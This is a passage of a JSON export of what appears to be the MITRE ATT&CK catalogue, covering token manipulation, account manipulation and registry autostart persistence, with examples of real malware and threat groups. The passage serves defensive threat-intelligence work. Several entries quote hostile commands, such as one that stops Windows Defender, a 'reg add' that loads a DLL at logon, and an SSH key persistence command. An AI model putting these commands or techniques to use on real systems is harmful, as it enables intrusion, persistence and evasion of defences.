tokens on targeted Windows systems."}, {"id": "S0058", "name": "SslMM", "description": "SslMM contains a feature to manipulate process privileges and tokens."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT modified its security token to grants itself debugging privileges by adding SeDebugPrivilege."}], "sub_techniques": [{"name": "Token Impersonation/Theft", "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.", "detailed_description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.", "id": "T1134.001", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to duplicate a token from ntprint.exe."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can impersonate a lsass.exe or vmtoolsd.exe token."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can use the tokens of users to create processes on infected systems."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can steal access tokens from exiting processes."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has the ability to duplicate the user\u2019s token. For example, Emotet may use a variant of Google\u2019s ProtoBuf to send messages that specify how code will be executed."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher uses token manipulation with NtFilterToken as part of UAC bypass."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used custom tooling to acquire tokens using ImpersonateLoggedOnUser/SetThreadToken."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can obtain a list of SIDs and provide the option for selecting process tokens to impersonate."}, {"id": "S0496", "name": "REvil", "description": "REvil can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon can impersonate tokens using LogonUser, ImpersonateLoggedOnUser, and ImpersonateNamedPipeClient."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can find a process owned by a specific user and impersonate the associated token."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape impersonates the main thread of CExecSvc.exe by calling NtImpersonateThread."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet attempts to impersonate an anonymous token to enumerate bindings in the service control manager."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask leverages token theft to obtain lsass.exe security permissions."}]}, {"name": "Create Process with Token", "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.", "detailed_description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.\nWhile this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.", "id": "T1134.002", "examples": [{"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to execute a process using runas."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user."}, {"id": "S0363", "name": "Empire", "description": "Empire can use Invoke-RunAs to make tokens."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can attempt to gain administrative privileges using token impersonation."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can use Invoke-RunAs to make tokens."}, {"id": "S0496", "name": "REvil", "description": "REvil can launch an instance of itself with administrative rights using runas."}, {"id": "G0010", "name": "Turla", "description": "Turla RPC backdoors can impersonate or steal process tokens before executing commands."}, {"id": "S0689", "name": "WhisperGate", "description": "The WhisperGate third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via %TEMP%\\AdvancedRun.exe\" /EXEFilename \"C:\\Windows\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a command called RunAs, which creates a new process as another user or process context."}]}, {"name": "Make and Impersonate Token", "description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.", "detailed_description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.\nThis behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.", "id": "T1134.003", "examples": [{"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can make tokens from known credentials."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized tools such as Incognito V2 for token manipulation and impersonation."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can create a token for a different user."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can make tokens from known credentials."}]}, {"name": "Parent PID Spoofing", "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.", "detailed_description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.", "id": "T1134.004", "examples": [{"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can spawn processes with alternate PPIDs."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate relies on parent PID spoofing as part of its \"rootkit-like\" functionality to evade detection via Task Manager or Process Explorer."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used parent PID spoofing to spawn a new cmd process using CreateProcessW and a handle to Taskmgr.exe."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can use parent PID spoofing to elevate privileges."}]}, {"name": "SID-History Injection", "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).", "detailed_description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.", "id": "T1134.005", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can add a SID-History to a user if on a domain controller."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz's MISC::AddSid module can append any SID or user/group account to a user's SID-History. Mimikatz also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain."}]}]}, {"name": "Account Manipulation", "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.", "detailed_description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.", "id": "T1098", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network."}, {"id": "S0274", "name": "Calisto", "description": "Calisto adds permissions and remote logins to all users."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has granted privileges to domain accounts."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator\u2019s account."}, {"id": "S0002", "name": "Mimikatz", "description": "The Mimikatz credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value."}], "sub_techniques": [{"name": "Additional Cloud Credentials", "description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.", "detailed_description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\nAdversaries may also use the CreateAccessKey API in AWS or the gcloud iam service-accounts keys create command in GCP to add access keys to an account. Alternatively, they may use the CreateLoginProfile API in AWS to add a password that can be used to log into the AWS Management Console for Cloud Service Dashboard. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts). For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator.\nIn AWS environments, adversaries with the appropriate permissions may also use the sts:GetFederationToken API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account. As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user\u2019s primary password is reset.", "id": "T1098.001", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can generate SSH and API keys for AWS infrastructure and additional API keys for other IAM users."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals."}]}, {"name": "Additional Email Delegate Permissions", "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.", "detailed_description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.\nFor example, the Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.", "id": "T1098.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used a Powershell cmdlet to grant the ApplicationImpersonation role to a compromised account."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used a compromised global administrator account in Azure AD to backdoor a service principal with ApplicationImpersonation rights to start collecting emails from targeted mailboxes; APT29 has also used compromised accounts holding ApplicationImpersonation rights in Exchange to collect emails."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors added the ApplicationImpersonation management role to accounts under their control to impersonate users and take ownership of targeted mailboxes."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals."}]}, {"name": "Additional Cloud Roles", "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).", "detailed_description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the CreatePolicyVersion API to define a new version of an IAM policy or the AttachUserPolicy API to attach an IAM policy with additional or distinct permissions to a compromised user account.\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.", "id": "T1098.003", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has added the global admin role to accounts they have created in the targeted organization's cloud instances."}, {"id": "G1015", "name": "Scattered Spider", "description": "During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges.Scattered Spider has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 granted company administrator privileges to a newly created service principle."}]}, {"name": "SSH Authorized Keys", "description": "Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <user-home>/.ssh/authorized_keys. Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \"yes\" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.", "detailed_description": "Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <user-home>/.ssh/authorized_keys. Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \"yes\" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.\nAdversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \"add-metadata\" command an adversary may add SSH keys to a user account. Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH. It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user.\nSSH keys can also be added to accounts on network devices, such as with the ip ssh pubkey-chain Network Device CLI command.", "id": "T1098.004", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore creates a new key pair with ssh-keygen and drops the newly created user key in authorized_keys to enable remote login."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has dropped an SSH-authorized key in the /root/.ssh folder in order to access a compromised server with SSH."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to add the public key of its handlers to the authorized_keys file to maintain persistence on an infected host."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has added RSA keys in authorized_keys."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET will create an ssh key if necessary with the ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P command. XCSSET will upload a private key file to the server to remotely access the host without a password."}]}, {"name": "Device Registration", "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.", "detailed_description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network. In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account.\nSimilarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.\nDevices registered in Entra ID may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client. Additionally, an adversary may be able to perform a Service Exhaustion Flood on an Entra ID tenant by registering a large number of devices.", "id": "T1098.005", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can register a device to Azure AD."}, {"id": "G0016", "name": "APT29", "description": "APT29 has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider registered devices for MFA to maintain persistence through victims' VPN."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command."}]}, {"name": "Additional Container Cluster Roles", "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account. Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.", "detailed_description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account. Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised.\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments. In these cases, this technique may be used in conjunction with Additional Cloud Roles.", "id": "T1098.006", "examples": []}, {"name": "Additional Local or Domain Groups", "description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.", "detailed_description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.\nOn Windows, accounts may use the net localgroup and net group commands to add existing users to local and domain groups. On Linux, adversaries may use the usermod command for the same purpose.\nFor example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage Remote Desktop Protocol to log into the endpoints in the future. On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage Sudo and Sudo Caching for elevated privileges.\nIn Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.", "id": "T1098.007", "examples": [{"id": "G0022", "name": "APT3", "description": "APT3 has been known to add created accounts to local admin groups to maintain elevated access."}, {"id": "G0096", "name": "APT41", "description": "APT41 has added user accounts to the User and Admin groups."}, {"id": "G1023", "name": "APT5", "description": "APT5 has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate elevates accounts created through the malware to the local administration group during execution."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has added newly created accounts to the administrators group to maintain elevated access."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has assigned newly created accounts the sysadmin role to maintain persistence."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has added accounts to specific groups with net localgroup."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups."}, {"id": "S0039", "name": "Net", "description": "The net localgroup and net group commands in Net can be used to add existing users to local and domain groups. "}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper has added a user named \"supportaccount\" to the Remote Desktop Users and Administrators groups."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has added user accounts to local Admin groups."}]}]}, {"name": "Boot or Logon Autostart Execution", "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.", "detailed_description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.", "id": "T1547", "examples": [{"id": "S0651", "name": "BoxCaon", "description": "BoxCaon established persistence by setting the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load registry key to point to its executable."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack\u2019s RAT makes a persistent target file with auto execution on the host start."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has created registry keys for persistence, including HKCU\\Software\\bkfouerioyou, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}."}, {"id": "S0083", "name": "Misdat", "description": "Misdat has created registry keys for persistence, including HKCU\\Software\\dnimtsoleht\\StubPath, HKCU\\Software\\snimtsOleht\\StubPath, HKCU\\Software\\Backtsaleht\\StubPath, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has added persistence via the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load which causes the malware to run each time any user logs in."}], "sub_techniques": [{"name": "Registry Run Keys / Startup Folder", "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.", "detailed_description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\nThe following Registry keys can control automatic startup of services during boot:\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.", "id": "T1547.001", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL achieves persistence by adding itself to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can add itself to the Registry as a startup program to establish persistence."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has changed the Startup folder to the one containing its executable by overwriting the registry keys."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA can establish persistence by dropping a sample of itself to C:\\ProgramData\\Local Settings\\Temp\\mskmde.com and adding a Registry run key to execute every time a user logs on."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to create the Registry key name EstsoftAutoUpdate at HKCU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnce to establish persistence."}, {"id": "G0026", "name": "APT18", "description": "APT18 establishes persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key."}, {"id": "G0073", "name": "APT19", "description": "An APT19 HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug 